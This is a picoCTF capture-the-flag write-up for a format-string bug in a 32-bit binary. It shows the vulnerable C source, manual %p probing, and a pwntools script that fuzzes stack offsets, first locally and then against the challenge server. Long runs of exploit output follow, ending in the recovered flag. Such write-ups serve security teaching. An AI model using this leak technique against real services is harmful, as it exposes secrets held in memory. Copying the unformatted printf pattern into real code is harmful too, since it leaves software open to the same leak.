### Binary Exploitation

### Source: PICOCTF

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7cdf03860c5c78d6e375e91d88a2b05b28389fd0, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ checksec vuln
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Pico/flakleak/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We're working with x86 binary. Which has only NX enabled as a protection

Source code is given

```
 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```


Reading it doesn't show any form of buffer overflow 

But there's a vulnerability which is this 

```
   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
 ```
 
We see that it stores the user input in the story buffer then prints it out without using a format specifier

This means that we're working with a binary with format string vulnerability

Cool! WIth this we can leak stuff off the stack of the binary

Reading the code shows that the flag is stored on the stack but it isn't called in the main function but we can possibly leak it

So basically to leak stuff off the stack can be done using various format specifier like %p, %d, %x 

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ ./vuln 
Tell me a story and then I'll tell you one >> AAAA%p%p%p%p%p%p%p%p%p%p
Here's a story - 
AAAA0xff8cf560(nil)0x80493460x414141410x702570250x702570250x702570250x702570250x702570250xf7f43400
```

Then the address we get we can then try to convert to string and we notice that our input is leaked also i.e AAAA is 0x414141 in hex

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ echo 0x41414141 | xxd -r 
AAAA
```

That means our input has an offset of 4 in the stack. So instead of doing AAAA%p%p%p we can just specify the offset to leak

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ ./vuln
Tell me a story and then I'll tell you one >> AAAA%4$p
Here's a story - 
AAAA0x41414141
```

And we can keep on going to see if there's any string in the stack leaked. Doing this manually will take a lot of time so instead i put up a script using the format_fuzz pwntools template to fuzz for the first 100 address on the stack 

```
from pwn import *

context.log_level = 'info'

string = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        #io = remote('localhost', 1337, level='warn')
        io = process('./vuln')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b"Here's a story -")
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up list of string leaked
                string += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(string)
```

While it fuzz address using %i$p where i is the range its fuzzing

It will then convert those address to string and decode its endianess then save it in a string variable

So after it runs finish it prints out the list of strings found

Lets run it 

```
──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/flakleak]
└─$ python2 exploit.py 
[+] Starting local process './vuln': pid 42901
[*] Process './vuln' stopped with exit code 0 (pid 42901)
0:  
%0$p

[+] Starting local process './vuln': pid 42903
1:  

[*] Stopped process './vuln' (pid 42903)
[+] Starting local process './vuln': pid 42905
2:  

[*] Stopped process './vuln' (pid 42905)
[+] Starting local process './vuln': pid 42907
[*] Process './vuln' stopped with exit code 0 (pid 42907)
3:  
0x8049346

F\x93\x04
[+] Starting local process './vuln': pid 42909
4:  
0x70243425

%4$p
[*] Process './vuln' stopped with exit code 0 (pid 42909)
[+] Starting local process './vuln': pid 42911
5:  

[*] Stopped process './vuln' (pid 42911)
[+] Starting local process './vuln': pid 42913
6:  

[*] Stopped process './vuln' (pid 42913)
[+] Starting local process './vuln': pid 42915
7:  

[*] Process './vuln' stopped with exit code 0 (pid 42915)
[+] Starting local process './vuln': pid 42917
8:  

[*] Stopped process './vuln' (pid 42917)
[+] Starting local process './vuln': pid 42919
9:  

[*] Stopped process './vuln' (pid 42919)
[+] Starting local process './vuln': pid 42921
10:  
0xf7fba4a0

\xa0\xa4��
[*] Process './vuln' stopped with exit code 0 (pid 42921)
[+] Starting local process './vuln': pid 42923
11:  

[*] Stopped process './vuln' (pid 42923)
[+] Starting local process './vuln': pid 42925
12:  

[*] Stopped process './vuln' (pid 42925)
[+] Starting local process './vuln': pid 42931
13:  

[*] Stopped process './vuln' (pid 42931)
[+] Starting local process './vuln': pid 42933
14:  

[*] Stopped process './vuln' (pid 42933)
[+] Starting local process './vuln': pid 42935
15:  

[*] Stopped process './vuln' (pid 42935)
[+] Starting local process './vuln': pid 42937
16:  

[*] Stopped process './vuln' (pid 42937)
[+] Starting local process './vuln': pid 42939
17:  

[*] Stopped process './vuln' (pid 42939)
[+] Starting local process './vuln': pid 42941
18:  

[*] Stopped process './vuln' (pid 42941)
[+] Starting local process './vuln': pid 42943
19:  

[*] Stopped process './vuln' (pid 42943)
[+] Starting local process './vuln': pid 42945
20:  

[*] Stopped process './vuln' (pid 42945)
[+] Starting local process './vuln': pid 42947
21:  
0xf7fe6c18

\x18\xfe�
[*] Process './vuln' stopped with exit code 0 (pid 42947)
[+] Starting local process './vuln': pid 42949
22:  
0xf7f997c0

����
[*] Process './vuln' stopped with exit code 0 (pid 42949)
[+] Starting local process './vuln': pid 42951
23:  

[*] Stopped process './vuln' (pid 42951)
[+] Starting local process './vuln': pid 42953
24:  

[*] Process './vuln' stopped with exit code 0 (pid 42953)
[+] Starting local process './vuln': pid 42955
25:  

[*] Stopped process './vuln' (pid 42955)
[+] Starting local process './vuln': pid 42957
26:  

[*] Stopped process './vuln' (pid 42957)
[+] Starting local process './vuln': pid 42959
27:  

[*] Stopped process './vuln' (pid 42959)
[+] Starting local process './vuln': pid 42961
28:  

[*] Stopped process './vuln' (pid 42961)
[+] Starting local process './vuln': pid 42963
29:  

[*] Stopped process './vuln' (pid 42963)
[+] Starting local process './vuln': pid 42965
30:  
0xf7f07ff4

���
[*] Process './vuln' stopped with exit code 0 (pid 42965)
[+] Starting local process './vuln': pid 42967
31:  
0x8048338

8\x83\x04
[*] Process './vuln' stopped with exit code 0 (pid 42967)
[+] Starting local process './vuln': pid 42969
[*] Process './vuln' stopped with exit code 0 (pid 42969)
32:  
0x804c034

4
[+] Starting local process './vuln': pid 42971
33:  

[*] Stopped process './vuln' (pid 42971)
[+] Starting local process './vuln': pid 42973
34:  

[*] Stopped process './vuln' (pid 42973)
[+] Starting local process './vuln': pid 42975
35:  

[*] Stopped process './vuln' (pid 42975)
[+] Starting local process './vuln': pid 42977
36:  

[*] Stopped process './vuln' (pid 42977)
[+] Starting local process './vuln': pid 42979
37:  
0x6b61667b

{fak
[*] Process './vuln' stopped with exit code 0 (pid 42979)
[+] Starting local process './vuln': pid 42981
38:  
0x6c665f65

e_fl
[*] Process './vuln' stopped with exit code 0 (pid 42981)
[+] Starting local process './vuln': pid 42983
39:  

[*] Stopped process './vuln' (pid 42983)
[+] Starting local process './vuln': pid 42989
[*] Process './vuln' stopped with exit code 0 (pid 42989)
40:  
0x745f726f

or_t
[+] Starting local process './vuln': pid 42991
[*] Process './vuln' stopped with exit code 0 (pid 42991)
41:  
0x69747365

esti
[+] Starting local process './vuln': pid 42993
[*] Process './vuln' stopped with exit code 0 (pid 42993)
42:  
0xa7d676e

ng}

[+] Starting local process './vuln': pid 42995
43:  

[*] Process './vuln' stopped with exit code 0 (pid 42995)
[+] Starting local process './vuln': pid 42997
44:  

[*] Stopped process './vuln' (pid 42997)
[+] Starting local process './vuln': pid 42999
45:  

[*] Stopped process './vuln' (pid 42999)
[+] Starting local process './vuln': pid 43001
46:  
0xf7e1e9b8

\xb8���
[*] Process './vuln' stopped with exit code 0 (pid 43001)
[+] Starting local process './vuln': pid 43003
47:  

[*] Stopped process './vuln' (pid 43003)
[+] Starting local process './vuln': pid 43005
48:  

[*] Stopped process './vuln' (pid 43005)
[+] Starting local process './vuln': pid 43007
[*] Process './vuln' stopped with exit code 0 (pid 43007)
49:  
0x804c000

\x00\x04
[+] Starting local process './vuln': pid 43009
50:  
0x8049430

0\x94\x04
[*] Stopped process './vuln' (pid 43009)
[+] Starting local process './vuln': pid 43011
51:  
0x8049410

\x10\x04
[*] Process './vuln' stopped with exit code 0 (pid 43011)
[+] Starting local process './vuln': pid 43013
52:  
0x3e8

�
[*] Process './vuln' stopped with exit code 0 (pid 43013)
[+] Starting local process './vuln': pid 43015
53:  
0x804c000

\x00\x04
[*] Process './vuln' stopped with exit code 0 (pid 43015)
[+] Starting local process './vuln': pid 43017
54:  
0xff93e928

(���
[*] Process './vuln' stopped with exit code 0 (pid 43017)
[+] Starting local process './vuln': pid 43019
55:  
0x8049418

\x18\x04
[*] Stopped process './vuln' (pid 43019)
[+] Starting local process './vuln': pid 43021
56:  
0xffb64200

\x00\xb6\xff
[*] Process './vuln' stopped with exit code 0 (pid 43021)
[+] Starting local process './vuln': pid 43023
57:  

[*] Stopped process './vuln' (pid 43023)
[+] Starting local process './vuln': pid 43025
58:  
0xf7ecbb50

P\xbb��
[*] Process './vuln' stopped with exit code 0 (pid 43025)
[+] Starting local process './vuln': pid 43027
59:  

[*] Stopped process './vuln' (pid 43027)
[+] Starting local process './vuln': pid 43029
60:  

[*] Stopped process './vuln' (pid 43029)
[+] Starting local process './vuln': pid 43031
61:  
0xf7e1cff4

����
[*] Process './vuln' stopped with exit code 0 (pid 43031)
[+] Starting local process './vuln': pid 43033
[*] Process './vuln' stopped with exit code 0 (pid 43033)
[+] Starting local process './vuln': pid 43035
[*] Process './vuln' stopped with exit code 0 (pid 43035)
63:  
0xf7c23295

\x952��
[+] Starting local process './vuln': pid 43041
64:  

[*] Stopped process './vuln' (pid 43041)
[+] Starting local process './vuln': pid 43043
65:  

[*] Stopped process './vuln' (pid 43043)
[+] Starting local process './vuln': pid 43045
66:  

[*] Stopped process './vuln' (pid 43045)
[+] Starting local process './vuln': pid 43047
67:  

[*] Process './vuln' stopped with exit code 0 (pid 43047)
[+] Starting local process './vuln': pid 43049
68:  

[*] Stopped process './vuln' (pid 43049)
[+] Starting local process './vuln': pid 43051
69:  

[*] Stopped process './vuln' (pid 43051)
[+] Starting local process './vuln': pid 43053
70:  

[*] Stopped process './vuln' (pid 43053)
[+] Starting local process './vuln': pid 43055
71:  

[*] Stopped process './vuln' (pid 43055)
[+] Starting local process './vuln': pid 43057
72:  

[*] Stopped process './vuln' (pid 43057)
[+] Starting local process './vuln': pid 43059
73:  
0x80493bf

\xbf\x93\x04
[*] Process './vuln' stopped with exit code 0 (pid 43059)
[+] Starting local process './vuln': pid 43061
[*] Process './vuln' stopped with exit code 0 (pid 43061)
74:  
0x1


[+] Starting local process './vuln': pid 43063
[*] Process './vuln' stopped with exit code 0 (pid 43063)
75:  
0xff99fa14

\x14\x99\xff
[+] Starting local process './vuln': pid 43065
76:  

[*] Stopped process './vuln' (pid 43065)
[+] Starting local process './vuln': pid 43067
[*] Process './vuln' stopped with exit code 0 (pid 43067)
77:  
0x8049430

0\x94\x04
[+] Starting local process './vuln': pid 43069
78:  

[*] Stopped process './vuln' (pid 43069)
[+] Starting local process './vuln': pid 43071
[*] Process './vuln' stopped with exit code 0 (pid 43071)
[+] Starting local process './vuln': pid 43073
80:  

[*] Stopped process './vuln' (pid 43073)
[+] Starting local process './vuln': pid 43075
81:  


[*] Process './vuln' stopped with exit code 0 (pid 43075)
[+] Starting local process './vuln': pid 43077
82:  

[*] Stopped process './vuln' (pid 43077)
[+] Starting local process './vuln': pid 43079
[*] Process './vuln' stopped with exit code 0 (pid 43079)
[+] Starting local process './vuln': pid 43081
[*] Process './vuln' stopped with exit code 0 (pid 43081)
[+] Starting local process './vuln': pid 43083
85:  

[*] Stopped process './vuln' (pid 43083)
[+] Starting local process './vuln': pid 43085
86:  

[*] Stopped process './vuln' (pid 43085)
[+] Starting local process './vuln': pid 43087
87:  

[*] Stopped process './vuln' (pid 43087)
[+] Starting local process './vuln': pid 43089
88:  

[*] Stopped process './vuln' (pid 43089)
[+] Starting local process './vuln': pid 43092
89:  

[*] Stopped process './vuln' (pid 43092)
[+] Starting local process './vuln': pid 43097
90:  
0xf7e1cff4

����
[*] Process './vuln' stopped with exit code 0 (pid 43097)
[+] Starting local process './vuln': pid 43099
91:  

[*] Stopped process './vuln' (pid 43099)
[+] Starting local process './vuln': pid 43101
92:  

[*] Stopped process './vuln' (pid 43101)
[+] Starting local process './vuln': pid 43103
[*] Process './vuln' stopped with exit code 0 (pid 43103)
93:  
0x804c000

\x00\x04
[+] Starting local process './vuln': pid 43105
94:  
0x1


[*] Process './vuln' stopped with exit code 0 (pid 43105)
[+] Starting local process './vuln': pid 43107
[*] Process './vuln' stopped with exit code 0 (pid 43107)
95:  
0x80491a0

\xa0\x91\x04
[+] Starting local process './vuln': pid 43109
96:  

[*] Stopped process './vuln' (pid 43109)
[+] Starting local process './vuln': pid 43111
97:  

[*] Stopped process './vuln' (pid 43111)
[+] Starting local process './vuln': pid 43113
[*] Process './vuln' stopped with exit code 0 (pid 43113)
98:  
0xf7c232d9

�2��
[+] Starting local process './vuln': pid 43115
[*] Process './vuln' stopped with exit code 0 (pid 43115)
99:  
0x804c000

\x00\x04
[*] %4$pflag{fake_for_testing}
```

We successfully leaked the flag from the stack

Now i'll edit the code and run it on the remote server

```
from pwn import *

context.log_level = 'info'

string = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        io = remote('saturn.picoctf.net', 59110, level='info')
        #io = process('./vuln')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b"Here's a story -")
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up list of string leaked
                string += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(string)
```

On running it, it takes quite some time and i eventually got the offset of the flag in the stack its around range(36, 46)

Here's the edited code

```
from pwn import *

context.log_level = 'info'

string = ''

# Let's fuzz x values
for i in range(36, 46):
    try:
        # Connect to server
        io = remote('saturn.picoctf.net', 50529)
        #io = process('./vuln')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b"Here's a story -")
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up list of string leaked
                string += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(string)
```

On running it now 

```
└─$ python2 exploit.py
[+] Opening connection to saturn.picoctf.net on port 50529: Done
36:  
0x6f636970

pico
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
37:  
0x7b465443

CTF{
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
38:  
0x6b34334c

L34k
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
39:  
0x5f676e31

1ng_
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
40:  
0x67346c46

Fl4g
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
41:  
0x6666305f

_0ff
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
42:  
0x3474535f

_St4
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
43:  
0x635f6b63

ck_c
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
44:  
0x34396532

2e94
[*] Closed connection to saturn.picoctf.net port 50529
[+] Opening connection to saturn.picoctf.net on port 50529: Done
45:  
0x7d643365

e3d}
[*] Closed connection to saturn.picoctf.net port 50529
[*] picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
                                                 
